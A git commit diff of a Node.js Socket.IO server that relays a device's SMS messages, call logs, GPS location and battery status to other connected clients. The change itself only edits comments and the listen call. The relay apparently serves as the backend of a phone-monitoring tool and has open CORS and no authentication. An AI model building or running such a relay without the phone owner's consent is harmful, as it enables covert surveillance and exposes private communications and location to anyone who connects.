3a589fe1584079e403f09492a39a09674cafd466
sekharathome <58811293+sekharathome@users.noreply.github.com>
2026-01-18 12:20:04 +0530

    Update server.js

--- server.js
+++ server.js
@@ -10,20 +10,21 @@ const io = new Server(server, { cors: { origin: "*" } });
 app.use(express.static(path.join(__dirname, 'public')));
 
 io.on('connection', (socket) => {
-    // Battery & SMS (Existing)
+    // Relay Battery
     socket.on('battery-status', (data) => socket.broadcast.emit('ui-battery', data));
+    
+    // Relay SMS
     socket.on('get-sms-request', () => socket.broadcast.emit('get-sms-request'));
     socket.on('sms-data-log', (data) => socket.broadcast.emit('ui-sms-display', data));
 
-    // [NEW: Call Log Forwarding]
+    // Relay Call Logs
     socket.on('get-calls-request', () => socket.broadcast.emit('get-calls-request'));
     socket.on('call-log-data', (data) => socket.broadcast.emit('ui-calls-display', data));
 
-    // [NEW: GPS Forwarding]
+    // Relay GPS
     socket.on('gps-update', (data) => socket.broadcast.emit('ui-gps', data));
 
     socket.on('disconnect', () => socket.broadcast.emit('device-status', { online: false }));
 });
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, '0.0.0.0', () => console.log(`Server Active on ${PORT}`));
+server.listen(process.env.PORT || 3000);
